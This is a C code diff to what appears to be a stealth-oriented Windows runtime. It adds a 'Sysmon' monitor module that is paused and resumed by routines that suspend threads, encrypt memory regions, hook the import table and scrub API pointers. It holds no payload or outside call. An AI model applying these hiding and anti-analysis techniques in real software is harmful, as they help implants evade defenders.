@@ -24,6 +24,7 @@
 #include "win_file.h"
 #include "win_http.h"
 #include "win_crypto.h"
+#include "sysmon.h"
 #include "shield.h"
 #include "runtime.h"
 #include "debug.h"
@@ -88,6 +89,9 @@ typedef struct {
     WinFile_M*   WinFile;
     WinHTTP_M*   WinHTTP;
     WinCrypto_M* WinCrypto;
+
+    // reliability modules
+    Sysmon_M* Sysmon;
 } Runtime;
 
 // export methods and IAT hooks about Runtime
@@ -155,6 +159,7 @@ static errno initWinBase(Runtime* runtime, Context* context);
 static errno initWinFile(Runtime* runtime, Context* context);
 static errno initWinHTTP(Runtime* runtime, Context* context);
 static errno initWinCrypto(Runtime* runtime, Context* context);
+static errno initSysmon(Runtime* runtime, Context* context);
 static bool  initIATHooks(Runtime* runtime);
 static bool  flushInstructionCache(Runtime* runtime);
 static void  eraseArgumentStub(Runtime* runtime);
@@ -674,6 +679,20 @@ static errno initSubmodules(Runtime* runtime)
         }
     }
 
+    // initialize reliability modules
+    module_t rel_modules[] = 
+    {
+        GetFuncAddr(&initSysmon),
+    };
+    for (int i = 0; i < arrlen(rel_modules); i++)
+    {
+        errno errno = rel_modules[i](runtime, &context);
+        if (errno != NO_ERROR)
+        {
+            return errno;
+        }
+    }
+
     // clean useless API functions in runtime structure
     RandBuffer((byte*)(&runtime->GetSystemInfo), sizeof(uintptr));
     RandBuffer((byte*)(&runtime->CreateMutexA),  sizeof(uintptr));
@@ -787,6 +806,17 @@ static errno initWinCrypto(Runtime* runtime, Context* context)
         return GetLastErrno();
     }
     runtime->WinCrypto = WinCrypto;
+    return NO_ERROR;
+}
+
+static errno initSysmon(Runtime* runtime, Context* context)
+{
+    Sysmon_M* Sysmon = InitSysmon(context);
+    if (Sysmon == NULL)
+    {
+        return GetLastErrno();
+    }
+    runtime->Sysmon = Sysmon;
     return NO_ERROR;
 }
 
@@ -1817,6 +1847,7 @@ static errno hide(Runtime* runtime)
 {
     typedef errno (*submodule_t)();
     submodule_t submodules[] = {
+        runtime->Sysmon->Pause,
         runtime->WinHTTP->Clean,
         runtime->ThreadTracker->Suspend,
         runtime->LibraryTracker->Encrypt,
@@ -1847,6 +1878,7 @@ static errno recover(Runtime* runtime)
         runtime->ResourceTracker->Decrypt,
         runtime->ArgumentStore->Decrypt,
         runtime->InMemoryStorage->Decrypt,
+        runtime->Sysmon->Continue,
         runtime->ThreadTracker->Resume,
     };
     errno err = NO_ERROR;
@@ -2095,7 +2127,10 @@ errno RT_Exit()
     typedef errno (*submodule_t)();
     submodule_t submodules[] = 
     {
-        // first kill all threads
+        // stop system monitor
+        runtime->Sysmon->Stop,
+
+        // kill all threads
         runtime->ThreadTracker->Clean,
 
         // high-level modules
